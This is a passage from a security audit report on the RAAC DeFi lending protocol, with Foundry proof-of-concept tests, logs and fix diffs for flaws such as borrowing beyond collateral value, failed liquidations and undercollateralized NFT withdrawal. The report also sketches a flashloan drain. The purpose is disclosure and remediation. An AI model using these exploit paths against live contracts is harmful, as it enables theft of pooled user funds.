import {LendingPool} from "../../contracts/core/pools/LendingPool/LendingPool.sol";
import {CrvUSDToken} from "../../contracts/mocks/core/tokens/crvUSDToken.sol";
import {RAACHousePrices} from "../../contracts/core/oracles/RAACHousePriceOracle.sol";
import {RAACNFT} from "../../contracts/core/tokens/RAACNFT.sol";
import {RToken} from "../../contracts/core/tokens/RToken.sol";
import {DebtToken} from "../../contracts/core/tokens/DebtToken.sol";
import {DEToken} from "../../contracts/core/tokens/DEToken.sol";
import {RAACToken} from "../../contracts/core/tokens/RAACToken.sol";
import {RAACMinter} from "../../contracts/core/minters/RAACMinter/RAACMinter.sol";
contract PoC is Test {
    StabilityPool public stabilityPool;
    LendingPool public lendingPool;
    CrvUSDToken public crvusd;
    RAACHousePrices public raacHousePrices;
    RAACNFT public raacNFT;
    RToken public rToken;
    DebtToken public debtToken;
    DEToken public deToken;
    RAACToken public raacToken;
    RAACMinter public raacMinter;

    address owner;
    address oracle;
    address user1;
    address user2;
    address user3;
    uint256 constant STARTING_TIME = 1641070800;
    uint256 public currentBlockTimestamp;
    uint256 constant WAD = 1e18;
    uint256 constant RAY = 1e27;

    function setUp() public {
        vm.warp(STARTING_TIME);
        currentBlockTimestamp = block.timestamp;
        owner = address(this);
        oracle = makeAddr("oracle");
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        user3 = makeAddr("user3");
        uint256 initialPrimeRate = 0.1e27;
        raacHousePrices = new RAACHousePrices(owner);
        vm.prank(owner);
        raacHousePrices.setOracle(oracle);
        crvusd = new CrvUSDToken(owner);
        raacNFT = new RAACNFT(address(crvusd), address(raacHousePrices), owner);
        rToken = new RToken("RToken", "RToken", owner, address(crvusd));
        debtToken = new DebtToken("DebtToken", "DT", owner);
        deToken = new DEToken("DEToken", "DEToken", owner, address(rToken));
        vm.prank(owner);
        crvusd.setMinter(owner);
        vm.prank(owner);
        lendingPool = new LendingPool(
                            address(crvusd),
                            address(rToken),
                            address(debtToken),
                            address(raacNFT),
                            address(raacHousePrices),
                            initialPrimeRate
                        );
        rToken.setReservePool(address(lendingPool));
        debtToken.setReservePool(address(lendingPool));
        rToken.transferOwnership(address(lendingPool));
        debtToken.transferOwnership(address(lendingPool));
        stabilityPool = new StabilityPool(address(owner));
        deToken.setStabilityPool(address(stabilityPool));
        raacToken = new RAACToken(owner, 0, 0);
        raacMinter = new RAACMinter(address(raacToken), address(stabilityPool), address(lendingPool), owner);
        stabilityPool.initialize(address(rToken), address(deToken), address(raacToken), address(raacMinter), address(crvusd), address(lendingPool));
        vm.prank(owner);
        raacToken.setMinter(address(raacMinter));
        crvusd.mint(address(attacker), type(uint128).max);
        crvusd.mint(user1, type(uint128).max);
        crvusd.mint(user2, type(uint128).max);
        crvusd.mint(user3, type(uint128).max);
    }

    function test_PocBorrowmoreThanColleteral() public {
        // Providing Liquidity so user1 can borrow
        vm.startPrank(user2);
        crvusd.approve(address(lendingPool), type(uint256).max);
        lendingPool.deposit(type(uint128).max);
        vm.stopPrank();
        // User1 buys/mints nft for 5e18 and loans 6e18 succeeds
        vm.prank(oracle);
        raacHousePrices.setHousePrice(2, 5e18);
        vm.startPrank(user1);
        crvusd.approve(address(raacNFT), 5e18);
        raacNFT.mint(2, 5e18);
        raacNFT.approve(address(lendingPool), 2);
        lendingPool.depositNFT(2);
        lendingPool.borrow(6e18);
    }
}
```

As you can see in above test after running it is:

```Solidity
Ran 1 test for test/invariant/PoC.t.sol:PoC
[PASS] test_PocBorrowmoreThanColleteralAndHealthFactorIsWrong() (gas: 730344)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.85ms (1.27ms CPU time)

Ran 1 test suite in 17.69ms (7.85ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

Even though, this should have definitely been a revert, since the user deposited a collateral value of 5 crvUSD but was able to borrow 6 crvUSD.
This behavior allows any user to mint a NFT, deposit it into the contract and take out more money than their NFT is worth.

## Impact

Since this vulnerability allows users to access crvUSD which exceeds their collateral value this vulnerability is by default high (critical), since it is a direct violation of solvency invariants and a direct accumulation of bad debt, since liquidation is not profitable anymore.
An amplifying fact is, that the whole transaction is possible within 1 transaction, therefore an attacker could take a flashloan, mint any/all NFTs, drain crvUSD from the Lending Pool, pay back the flashloan and walk away with a nice profit.

## Tools Used

Manual Review & Foundry

## Recommended Mitigation

Multiply the right value as such:

```diff
function borrow(uint256 amount) external nonReentrant whenNotPaused onlyValidAmount(amount) {
        if (isUnderLiquidation[msg.sender]) revert CannotBorrowUnderLiquidation();
        UserData storage user = userData[msg.sender];
        uint256 collateralValue = getUserCollateralValue(msg.sender);
        if (collateralValue == 0) revert NoCollateral();
        ReserveLibrary.updateReserveState(reserve, rateData);
        _ensureLiquidity(amount);
        uint256 userTotalDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex) + amount;
-       if (collateralValue < userTotalDebt.percentMul(liquidationThreshold)) {
-           revert NotEnoughCollateralToBorrow();
-       }
+       if (collateralValue.percentMul(liquidationThreshold) < userTotalDebt) {
+            revert NotEnoughCollateralToBorrow();
+       }
        uint256 scaledAmount = amount.rayDiv(reserve.usageIndex);
       (bool isFirstMint, uint256 amountMinted, uint256 newTotalSupply) = IDebtToken(reserve.reserveDebtTokenAddress).mint(msg.sender, msg.sender, amount, reserve.usageIndex);
        IRToken(reserve.reserveRTokenAddress).transferAsset(msg.sender, amount);
        user.scaledDebtBalance += scaledAmount;
        reserve.totalUsage = newTotalSupply;
        ReserveLibrary.updateInterestRatesAndLiquidity(reserve, rateData, 0, amount);
        _rebalanceLiquidity();
        emit Borrow(msg.sender, amount);
    }
```

Applying the fix and rerunning the test results in expected results. The user is not able to borrow more than 4crvUSD which is expected with a LTV of 80%.

## Appendix

Copy the following import into your `Hardhat.Config` file in the projects root dir:
`require("@nomicfoundation/hardhat-foundry");`

Paste the following into a new file "Makefile" into the projects root directory:

```Solidity
.PHONY: install-foundry init-foundry all

  

install-foundry:

    npm install --save-dev @nomicfoundation/hardhat-foundry

  

init-foundry: install-foundry

    npx hardhat init-foundry


  

# Default target that runs everything in sequence

all: install-foundry init-foundry 
```

And run `make all`

## <a id='H-05'></a>H-05. Mismatch of crvUSD approved versus transferred between StabilityPool and LendingPool prevents users from being liquidated            



## Description

For user liquidation expected behavior is that an Owner or Manager of `StabilityPool` calls into `StabilityPool::liquidateBorrower` to finalize the liquidation of an under-collateralized user after the grace period has passed. A mismatch between the approval of the crvUSD given within `StabilityPool::liquidateBorrower` versus the actual transfer of those tokens from `LendingPool::finalizeLiquidation` will cause the liquidation though to revert.



## Vulnerable Code

`LendingPool::finalizeLiquidation`:

```Solidity
    function finalizeLiquidation(address userAddress) external nonReentrant onlyStabilityPool { //
        /// *** SNIP *** ///
@>      IERC20(reserve.reserveAssetAddress).safeTransferFrom(msg.sender, reserve.reserveRTokenAddress, amountScaled);
        user.scaledDebtBalance -= amountBurned;
        reserve.totalUsage = newTotalSupply;
        ReserveLibrary.updateInterestRatesAndLiquidity(reserve, rateData, amountScaled, 0);
        emit LiquidationFinalized(stabilityPool, userAddress, userDebt, getUserCollateralValue(userAddress));
    }
```

`StabilityPool::liquidateBorrower`:

```Solidity
    function liquidateBorrower(address userAddress) external onlyManagerOrOwner nonReentrant whenNotPaused {
        _update();
        uint256 userDebt = lendingPool.getUserDebt(userAddress);
@>      uint256 scaledUserDebt = WadRayMath.rayMul(userDebt, lendingPool.getNormalizedDebt());
        if (userDebt == 0) revert InvalidAmount();
        uint256 crvUSDBalance = crvUSDToken.balanceOf(address(this));
        if (crvUSDBalance < scaledUserDebt) revert InsufficientBalance();
        bool approveSuccess = crvUSDToken.approve(address(lendingPool), scaledUserDebt);
        if (!approveSuccess) revert ApprovalFailed();
        lendingPool.updateState();
        lendingPool.finalizeLiquidation(userAddress);
        emit BorrowerLiquidated(userAddress, scaledUserDebt);
    }
```

On the functions above at the highlight marks you can see the points in which the approval and transfer ratios are calculated. The issue which arises is that `LendingPool::finalizeLiquidation` uses a different way than `StabilityPool::liquidateBorrower`, LendingPool factors in accrued interest rates, while the StabilityPool does not, resulting in a mismatched (too small) approval within the `StabilityPool::liquidateBorrower` function, thus reverting the liquidation of the user.

## PoC

Since the PoC is a foundry test I have added a Makefile at the end of this report to simplify installation for your convenience. Otherwise if console commands would be prefered:

First run: `npm install --save-dev @nomicfoundation/hardhat-foundry`

Second add: `require("@nomicfoundation/hardhat-foundry");` on top of the `Hardhat.Config` file in the projects root directory.

Third run: `npx hardhat init-foundry`

And lastly, you will encounter one of the mock contracts throwing an error during compilation, this error can be circumvented by commenting out the code in entirety (`ReserveLibraryMocks.sol`).

And the test should be good to go:

After following above steps copy & paste the following code into `./test/invariant/PoC.t.sol` and run `forge test --mt test_PocLiquidationNotPossibleDueToAllowanceTransferMismatch -vvvvv`

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {StabilityPool} from "../../contracts/core/pools/StabilityPool/StabilityPool.sol";
import {LendingPool} from "../../contracts/core/pools/LendingPool/LendingPool.sol";
import {CrvUSDToken} from "../../contracts/mocks/core/tokens/crvUSDToken.sol";
import {RAACHousePrices} from "../../contracts/core/oracles/RAACHousePriceOracle.sol";
import {RAACNFT} from "../../contracts/core/tokens/RAACNFT.sol";
import {RToken} from "../../contracts/core/tokens/RToken.sol";
import {DebtToken} from "../../contracts/core/tokens/DebtToken.sol";
import {DEToken} from "../../contracts/core/tokens/DEToken.sol";
import {RAACToken} from "../../contracts/core/tokens/RAACToken.sol";
import {RAACMinter} from "../../contracts/core/minters/RAACMinter/RAACMinter.sol";

contract PoC is Test {
    StabilityPool public stabilityPool;
    LendingPool public lendingPool;
    CrvUSDToken public crvusd;
    RAACHousePrices public raacHousePrices;
    RAACNFT public raacNFT;
    RToken public rToken;
    DebtToken public debtToken;
    DEToken public deToken;
    RAACToken public raacToken;
    RAACMinter public raacMinter;
    address owner;
    address oracle;
    address user1;
    address user2;
    address user3;
    uint256 constant STARTING_TIME = 1641070800;
    uint256 public currentBlockTimestamp;
    uint256 constant WAD = 1e18;
    uint256 constant RAY = 1e27;

    function setUp() public {
        vm.warp(STARTING_TIME);
        currentBlockTimestamp = block.timestamp;
        owner = address(this);
        oracle = makeAddr("oracle");
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        user3 = makeAddr("user3");
        uint256 initialPrimeRate = 0.1e27;
        raacHousePrices = new RAACHousePrices(owner);
        vm.prank(owner);
        raacHousePrices.setOracle(oracle);
        crvusd = new CrvUSDToken(owner);
        raacNFT = new RAACNFT(address(crvusd), address(raacHousePrices), owner);
        rToken = new RToken("RToken", "RToken", owner, address(crvusd));
        debtToken = new DebtToken("DebtToken", "DT", owner);
        deToken = new DEToken("DEToken", "DEToken", owner, address(rToken));
        vm.prank(owner);
        crvusd.setMinter(owner);
        vm.prank(owner);
        lendingPool = new LendingPool(
                            address(crvusd),
                            address(rToken),
                            address(debtToken),
                            address(raacNFT),
                            address(raacHousePrices),
                            initialPrimeRate
                        );
        rToken.setReservePool(address(lendingPool));
        debtToken.setReservePool(address(lendingPool));
        rToken.transferOwnership(address(lendingPool));
        debtToken.transferOwnership(address(lendingPool));
        stabilityPool = new StabilityPool(address(owner));
        deToken.setStabilityPool(address(stabilityPool));
        raacToken = new RAACToken(owner, 0, 0);
        raacMinter = new RAACMinter(address(raacToken), address(stabilityPool), address(lendingPool), owner);
        stabilityPool.initialize(address(rToken), address(deToken), address(raacToken), address(raacMinter), address(crvusd), address(lendingPool));
        vm.prank(owner);
        raacToken.setMinter(address(raacMinter));
        crvusd.mint(address(attacker), type(uint128).max);
        crvusd.mint(user1, type(uint128).max);
        crvusd.mint(user2, type(uint128).max);
        crvusd.mint(user3, type(uint128).max);
    }
  
    function test_PocLiquidationNotPossibleDueToAllowanceTransferMismatch() public {
        /// Setting the stage, incl. minting crvUSD to stability pool
        vm.prank(owner);
        lendingPool.setStabilityPool(address(stabilityPool));
        crvusd.mint(address(stabilityPool), type(uint128).max);
        vm.startPrank(user2);
        crvusd.approve(address(lendingPool), type(uint256).max);
        lendingPool.deposit(type(uint128).max);
        vm.stopPrank();
        vm.startPrank(oracle);
        raacHousePrices.setHousePrice(1, 10e18);
        raacHousePrices.setHousePrice(2, 10e18);
        raacHousePrices.setHousePrice(3, 10e18);
        raacHousePrices.setHousePrice(4, 10e18);
        vm.stopPrank();
        /// Acquiring the NFTs, depositing them and borrow against them
        vm.startPrank(user1);
        crvusd.approve(address(raacNFT), type(uint256).max);
        raacNFT.mint(1, 10e18);
        raacNFT.mint(2, 10e18);
        raacNFT.mint(3, 10e18);
        raacNFT.mint(4, 10e18);
        raacNFT.approve(address(lendingPool), 1);
        raacNFT.approve(address(lendingPool), 2);
        raacNFT.approve(address(lendingPool), 3);
        lendingPool.depositNFT(1);
        lendingPool.depositNFT(2);
        lendingPool.depositNFT(3);
        lendingPool.borrow(24e18);
        /// Reducing the Price of the NFTs, making the user liquidatable
        vm.startPrank(oracle);
        raacHousePrices.setHousePrice(1, 4e18);
        raacHousePrices.setHousePrice(2, 4e18);
        raacHousePrices.setHousePrice(3, 4e18);
        raacHousePrices.setHousePrice(4, 100e18);
        vm.stopPrank();
        /// Initiate liquidation and rolling forward to pass grace period
        lendingPool.initiateLiquidation(user1);
        uint256 time = block.timestamp;
        vm.warp(time + 4 * 1 days);
        /// Finalizing the Liquidation, which reverts due to ERC20InsufficientAllowance
        vm.prank(owner);
        stabilityPool.liquidateBorrower(user1);
    }
```

Running above test will produce the following log:

```javascript
Ran 1 test suite in 1.25s (76.97ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/invariant/PoC.t.sol:PoC
[FAIL: ERC20InsufficientAllowance(0x1d1499e622D69689cdf9004d05Ec547d650Ff211, 24000000000000000000 [2.4e19], 24006576243279862299 [2.4e19])] test_PocLiquidationNotPossibleDueToAllowanceTransferMismatch() (gas: 1943443)
```

Inspecting the output further with `-vvvvv` shows us the following 2 lines clearly:

```JavaScript
/////// ***SNIP*** //////////
[24780] CrvUSDToken::approve(LendingPool: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], 24000000000000000000 [2.4e19])
emit Approval(owner: StabilityPool: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], spender: LendingPool: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], value: 24000000000000000000 [2.4e19])
/////// ***SNIP*** //////////
CrvUSDToken::transferFrom(StabilityPool: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], RToken: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 24006576243279862299 [2.4e19])
    │   │   │   └─ ← [Revert] ERC20InsufficientAllowance(0x1d1499e622D69689cdf9004d05Ec547d650Ff211, 24000000000000000000 [2.4e19], 24006576243279862299 [2.4e19])
/////// ***SNIP*** //////////
```

`StabilityPool::liquidateBorrower` approves 2.4e19 crvUSD for the Lending Pool to pull, but the transfer actually executed carries dust (accrued interest over the 4 days) above the approved balance (2.40065....) causing a revert in the liquidation process.



## Impact

Failure to liquidate users leads to accumulation of bad debt and therefor directly harming the solvency invariant of the protocol to the point at which the protocol is not able to pay outstanding balances to it's users. Therefore the severity is High (critical) by default.



## Tools Used

Manual Review & Foundry



## Recommended Mitigation

Assure that the approval set in `StabilityPool::liquidateBorrower` is sufficient for the transaction to succeed, by factoring in accrued interest of the borrower, e.g. like:

```diff
    function liquidateBorrower(address userAddress) external onlyManagerOrOwner nonReentrant whenNotPaused {
        _update();
        uint256 userDebt = lendingPool.getUserDebt(userAddress);
        uint256 scaledUserDebt = WadRayMath.rayMul(userDebt, lendingPool.getNormalizedDebt());
        if (userDebt == 0) revert InvalidAmount();
        uint256 crvUSDBalance = crvUSDToken.balanceOf(address(this));
        if (crvUSDBalance < scaledUserDebt) revert InsufficientBalance();
-       bool approveSuccess = crvUSDToken.approve(address(lendingPool), scaledUserDebt);
+       bool approveSuccess = crvUSDToken.approve(address(lendingPool), type(uint256).max);
        if (!approveSuccess) revert ApprovalFailed();
        lendingPool.updateState();
        lendingPool.finalizeLiquidation(userAddress);
        emit BorrowerLiquidated(userAddress, scaledUserDebt);
    }
```

Since the function has strict access control and the lending pool only 1 way to withdraw those funds, a max approval should be okay, to ensure the liquidation will succeed.



## Appendix

Copy the following import into your `Hardhat.Config` file in the projects root dir:
`require("@nomicfoundation/hardhat-foundry");`

Paste the following into a new file "Makefile" into the projects root directory:

```
.PHONY: install-foundry init-foundry all

  

install-foundry:

    npm install --save-dev @nomicfoundation/hardhat-foundry

  

init-foundry: install-foundry

    npx hardhat init-foundry



# Default target that runs everything in sequence

all: install-foundry init-foundry 
```

And run `make all`

## <a id='H-06'></a>H-06. After Liquidating a user NFTs are transferred into the StabilityPool which though lacks functionality to withdraw them, effectively locking them in the contract            



## Description

During the liquidation scenario of a user within `LendingPool::finalizeLiquidation` the users NFT are getting transferred into the `StabilityPool` which though lacks functionality to forward or approve those NFTs effectively locking them within the contract.

## Vulnerable Code

`LendingPool::finalizeLiquidation`:

```Solidity
function finalizeLiquidation(address userAddress) external nonReentrant onlyStabilityPool { //
        if (!isUnderLiquidation[userAddress]) revert NotUnderLiquidation();
        ReserveLibrary.updateReserveState(reserve, rateData);
        if (block.timestamp <= liquidationStartTime[userAddress] + liquidationGracePeriod) {
            revert GracePeriodNotExpired();
        }
        UserData storage user = userData[userAddress];
        uint256 userDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex);
        isUnderLiquidation[userAddress] = false;
        liquidationStartTime[userAddress] = 0;
         // Transfer NFTs to Stability Pool
        for (uint256 i = 0; i < user.nftTokenIds.length; i++) {
            uint256 tokenId = user.nftTokenIds[i];
            user.depositedNFTs[tokenId] = false;
@>          raacNFT.transferFrom(address(this), stabilityPool, tokenId);
        }
        delete user.nftTokenIds;
        (uint256 amountScaled, uint256 newTotalSupply, uint256 amountBurned, uint256 balanceIncrease) = IDebtToken(reserve.reserveDebtTokenAddress).burn(userAddress, userDebt, reserve.usageIndex);
        IERC20(reserve.reserveAssetAddress).safeTransferFrom(msg.sender, reserve.reserveRTokenAddress, amountBurned); // amountScaled
        user.scaledDebtBalance -= amountBurned;
        reserve.totalUsage = newTotalSupply;
        ReserveLibrary.updateInterestRatesAndLiquidity(reserve, rateData, amountScaled, 0);
        emit LiquidationFinalized(stabilityPool, userAddress, userDebt, getUserCollateralValue(userAddress));
    }
```

Looking at the highlighted line above we clearly see, that NFTs are being transferred into the `StabilityPool`. Looking now at the interface of it:

`IStabilityPool`:

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
interface IStabilityPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 deCRVUSDAmount) external;
    function liquidateBorrower(address userAddress) external;
    /* ========== VIEW FUNCTIONS ========== */
    function getExchangeRate() external view returns (uint256);
    function calculateDeCRVUSDAmount(uint256 rcrvUSDAmount) external view returns (uint256);
    function calculateRcrvUSDAmount(uint256 deCRVUSDAmount) external view returns (uint256);
    function calculateRaacRewards(address user) external view returns (uint256);
    function getPendingRewards(address user) external view returns (uint256);
    function getTotalDeposits() external view returns (uint256);
    function getUserDeposit(address user) external view returns (uint256);
    function balanceOf(address user) external view returns (uint256);
    /* ========== MANAGER FUNCTIONS ========== */
    function getManagerAllocation(address manager) external view returns (uint256);
    function getTotalAllocation() external view returns (uint256);
    function getManager(address manager) external view returns (bool);
    function getManagers() external view returns (address[] memory);
    /* ========== ADMIN FUNCTIONS ========== */
    function addManager(address manager, uint256 allocation) external;
    function removeManager(address manager) external;
    function updateAllocation(address manager, uint256 newAllocation) external;
    function setRAACMinter(address _raacMinter) external;
    function depositRAACFromPool(uint256 amount) external;
    function pause() external;
    function unpause() external;
    /* ========== EVENTS ========== */
	//// ***SNIP*** ////
}
```

we can see that there is no functionality implemented to withdraw/transfer these liquidated NFTs.

## Impact

Locking those NFTs within the `StabilityPool` basically makes liquidating users unprofitable, since the liquidation mechanic directly relies on selling the liquidated NFTs. Therefore the spent crvUSD during liquidation are under these circumstances a direct loss to the protocol, breaking solvency.

By default his justifies a severity of High.

## Tools Used

Manual Review

## Recommended Fix

Integrate functionality into the `StabilityPool` to be able to approve/send those NFTs.

## <a id='H-07'></a>H-07. WithdrawNft in LendingPool has an logic error leaving the protocol with bad debt            



## Description

One crucial check in `LendingPool::withdrawNFT` is to check if the balance after withdrawing an NFT is sufficient to back the loaned assets, however the multiplier is applied on the wrong side of the equation, resulting in users being able to withdraw NFTs which they should not, leaving the vault with bad debt.



## Vulnerable Code & Details

`LendingPool::withdrawNFT`:

```Solidity
    function withdrawNFT(uint256 tokenId) external nonReentrant whenNotPaused {
        if (isUnderLiquidation[msg.sender]) revert CannotWithdrawUnderLiquidation();
        UserData storage user = userData[msg.sender];
        if (!user.depositedNFTs[tokenId]) revert NFTNotDeposited();
        ReserveLibrary.updateReserveState(reserve, rateData);
        uint256 userDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex);
        uint256 collateralValue = getUserCollateralValue(msg.sender);
        uint256 nftValue = getNFTPrice(tokenId);
@>      if (collateralValue - nftValue < userDebt.percentMul(liquidationThreshold)) {
            revert WithdrawalWouldLeaveUserUnderCollateralized();
        }
        for (uint256 i = 0; i < user.nftTokenIds.length; i++) {
            if (user.nftTokenIds[i] == tokenId) {
                user.nftTokenIds[i] = user.nftTokenIds[user.nftTokenIds.length - 1];
                user.nftTokenIds.pop();
                break;
            }
        }
        user.depositedNFTs[tokenId] = false;
        raacNFT.safeTransferFrom(address(this), msg.sender, tokenId);
        emit NFTWithdrawn(msg.sender, tokenId);
    }
```

Looking at the Highlighted Line consider the following Scenario:

Bob has 6 NFTs
Bobs 6 NFTs are worth 5 crvUSD each, so he owns NFTs worth 30 crvUSD together.
Bob deposits these 6 NFTs into the Lending Pool and borrows 24 crvUSD which should be the maximum considering a LTV of 80%.
Now bob decided to withdraw NFT ID 1 and NFT ID 6 with a value of 10 crvUSD together, since this would leave Bob with 2 NFTs worth 10 crvUSD together + his borrowed amount of 24 crvUSD therefor a total value of 34 crvUSD. Obviously this should not be possible since this would leave Bob with a health factor way below 1e18, but due to multiplying the wrong side of the equation it is.



## PoC

Since the PoC is a foundry test I have added a Makefile at the end of this report to simplify installation for your convenience. Otherwise if console commands would be prefered:

First run: `npm install --save-dev @nomicfoundation/hardhat-foundry`

Second add: `require("@nomicfoundation/hardhat-foundry");` on top of the `Hardhat.Config` file in the projects root directory.

Third run: `npx hardhat init-foundry`

And lastly, you will encounter one of the mock contracts throwing an error during compilation, this error can be circumvented by commenting out the code in entirety (`ReserveLibraryMocks.sol`).

And the test should be good to go:

After following above steps copy & paste the following code into `./test/invariant/PoC.t.sol` and run `forge test --mt test_withdrawNftCanLeaveProtocolWithBadDebt -vv`

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {StabilityPool} from "../../contracts/core/pools/StabilityPool/StabilityPool.sol";
import {LendingPool} from "../../contracts/core/pools/LendingPool/LendingPool.sol";
import {CrvUSDToken} from "../../contracts/mocks/core/tokens/crvUSDToken.sol";
import {RAACHousePrices} from "../../contracts/core/oracles/RAACHousePriceOracle.sol";
import {RAACNFT} from "../../contracts/core/tokens/RAACNFT.sol";
import {RToken} from "../../contracts/core/tokens/RToken.sol";
import {DebtToken} from "../../contracts/core/tokens/DebtToken.sol";
import {DEToken} from "../../contracts/core/tokens/DEToken.sol";
import {RAACToken} from "../../contracts/core/tokens/RAACToken.sol";
import {RAACMinter} from "../../contracts/core/minters/RAACMinter/RAACMinter.sol";
contract PoC is Test {
    StabilityPool public stabilityPool;
    LendingPool public lendingPool;
    CrvUSDToken public crvusd;
    RAACHousePrices public raacHousePrices;
    RAACNFT public raacNFT;
    RToken public rToken;
    DebtToken public debtToken;
    DEToken public deToken;
    RAACToken public raacToken;
    RAACMinter public raacMinter;
    address owner;
    address oracle;
    address user1;
    address user2;
    address user3;
    uint256 constant STARTING_TIME = 1641070800;
    uint256 public currentBlockTimestamp;
    uint256 constant WAD = 1e18;
    uint256 constant RAY = 1e27;

    function setUp() public {
        vm.warp(STARTING_TIME);
        currentBlockTimestamp = block.timestamp;
        owner = address(this);
        oracle = makeAddr("oracle");
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        user3 = makeAddr("user3");
        uint256 initialPrimeRate = 0.1e27;
        raacHousePrices = new RAACHousePrices(owner);
        vm.prank(owner);
        raacHousePrices.setOracle(oracle);
        crvusd = new CrvUSDToken(owner);
        raacNFT = new RAACNFT(address(crvusd), address(raacHousePrices), owner);
        rToken = new RToken("RToken", "RToken", owner, address(crvusd));
        debtToken = new DebtToken("DebtToken", "DT", owner);
        deToken = new DEToken("DEToken", "DEToken", owner, address(rToken));
        vm.prank(owner);
        crvusd.setMinter(owner);
        vm.prank(owner);
        lendingPool = new LendingPool(
                            address(crvusd),
                            address(rToken),
                            address(debtToken),
                            address(raacNFT),
                            address(raacHousePrices),
                            initialPrimeRate
                        );
        rToken.setReservePool(address(lendingPool));
        debtToken.setReservePool(address(lendingPool));
        rToken.transferOwnership(address(lendingPool));
        debtToken.transferOwnership(address(lendingPool));
        stabilityPool = new StabilityPool(address(owner));
        deToken.setStabilityPool(address(stabilityPool));
        raacToken = new RAACToken(owner, 0, 0);
        raacMinter = new RAACMinter(address(raacToken), address(stabilityPool), address(lendingPool), owner);
        stabilityPool.initialize(address(rToken), address(deToken), address(raacToken), address(raacMinter), address(crvusd), address(lendingPool));
        vm.prank(owner);
        raacToken.setMinter(address(raacMinter));
        crvusd.mint(address(attacker), type(uint128).max);
        crvusd.mint(user1, type(uint128).max);
        crvusd.mint(user2, type(uint128).max);
        crvusd.mint(user3, type(uint128).max);
    }

    function test_withdrawNftCanLeaveProtocolWithBadDebt() public {
        /// Setting Liquidity Conditions
        vm.startPrank(user3);
        crvusd.approve(address(lendingPool), 100e18);
        lendingPool.deposit(100e18);
        vm.stopPrank();
        /// Bob Purchases 6 nfts and deposits them
        for(uint256 i = 1; i <= 6; i++) {
            vm.startPrank(oracle);
            raacHousePrices.setHousePrice(i, 5e18);
            vm.stopPrank();
            vm.startPrank(user1);
            crvusd.approve(address(raacNFT), type(uint256).max);
            raacNFT.mint(i, 5e18);
            raacNFT.approve(address(lendingPool), i);
            lendingPool.depositNFT(i);
            vm.stopPrank();
        }
        /// Now Bob borrows the maximum amount he can borrow against them and simply withdraws 2 of those NFTs, leaving his position undercolleteralized
        vm.startPrank(user1);
        lendingPool.borrow(24e18);
        lendingPool.withdrawNFT(1);
        lendingPool.withdrawNFT(6);
        /// Logs, Asserts and initiateLiquidation for good measure
        uint256 healthFactor = lendingPool.calculateHealthFactor(user1);
        assert(healthFactor < 1e18);
        console.log("Users Helth Factor:", healthFactor);
        lendingPool.initiateLiquidation(user1);
        vm.stopPrank();
    }
```

Running above PoC produces the following log:

```Solidity
Ran 1 test for test/invariant/PoC.t.sol:PoC
[PASS] test_withdrawNftCanLeaveProtocolWithBadDebt() (gas: 2016930)
Logs:
  Users Helth Factor: 666666666666666666

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 23.37ms (10.00ms CPU time)

Ran 1 test suite in 28.81ms (23.37ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

Clearly highlighting the attack path is executable and leaving the Protocol on financial loss.



## Impact

As described above, this vulnerability is a free money exploit for users, being able to withdraw a vast amount of their collateral against the assumption, that a user always has to be overcollateralized, is directly affecting the solvency of the protocol, since the liquidation of Bob in above scenario is not profitable anymore. Therefor I rate it High, it is easy to to and the impact definitely high



## Tools Used

Manual Review & Foundry



## Recommended Mitigation

Change the multiplicator on the left side of the equation like:

```diff
function withdrawNFT(uint256 tokenId) external nonReentrant whenNotPaused {
        if (isUnderLiquidation[msg.sender]) revert CannotWithdrawUnderLiquidation();
        UserData storage user = userData[msg.sender];
        if (!user.depositedNFTs[tokenId]) revert NFTNotDeposited();
        ReserveLibrary.updateReserveState(reserve, rateData);
        uint256 userDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex);
        uint256 collateralValue = getUserCollateralValue(msg.sender);
        uint256 nftValue = getNFTPrice(tokenId);
-       if (collateralValue - nftValue < userDebt.percentMul(liquidationThreshold)) {
+       if ((collateralValue - nftValue).percentMul(liquidationThreshold) < userDebt) {
            revert WithdrawalWouldLeaveUserUnderCollateralized();
        }
        for (uint256 i = 0; i < user.nftTokenIds.length; i++) {
            if (user.nftTokenIds[i] == tokenId) {
                user.nftTokenIds[i] = user.nftTokenIds[user.nftTokenIds.length - 1];
                user.nftTokenIds.pop();
                break;
            }
        }
        user.depositedNFTs[tokenId] = false;
        raacNFT.safeTransferFrom(address(this), msg.sender, tokenId);
        emit NFTWithdrawn(msg.sender, tokenId);
    }
```



## Appendix

Copy the following import into your `Hardhat.Config` file in the projects root dir:
`require("@nomicfoundation/hardhat-foundry");`

Paste the following into a new file "Makefile" into the projects root directory:

```
.PHONY: install-foundry init-foundry all

  

install-foundry:

    npm install --save-dev @nomicfoundation/hardhat-foundry

  

init-foundry: install-foundry

    npx hardhat init-foundry



# Default target that runs everything in sequence

all: install-foundry init-foundry 
```

And run `make all`

## <a id='H-08'></a>H-08. RAAC Token fees on transfer do not use FeeCollector collectFee, therefore bypassing accounting logic            



## Description

The RAAC Token is designed to be able to collect fees and burn a certain amount of transferred assets. The collected fees from every transaction, if taxes are enabled within the contract, will transfer the funds directly into the `FeeCollector` contract. The issue arising here is, that the contract lacks functionality to effectively deal with directly transferred funds.

## Vulnerability Details

As you can see in the following `RAACToken::_update` function:

```Solidity
function _update(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
